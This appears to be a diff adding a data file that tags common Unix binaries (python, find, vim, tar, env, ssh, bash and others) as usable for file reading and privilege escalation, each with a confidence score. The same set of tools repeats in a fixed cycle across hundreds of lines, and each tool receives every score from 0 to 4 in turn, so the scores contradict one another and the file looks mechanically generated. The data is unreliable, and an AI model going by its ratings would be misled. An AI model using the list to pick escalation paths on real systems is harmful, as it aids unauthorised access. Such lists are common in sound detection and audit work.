+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
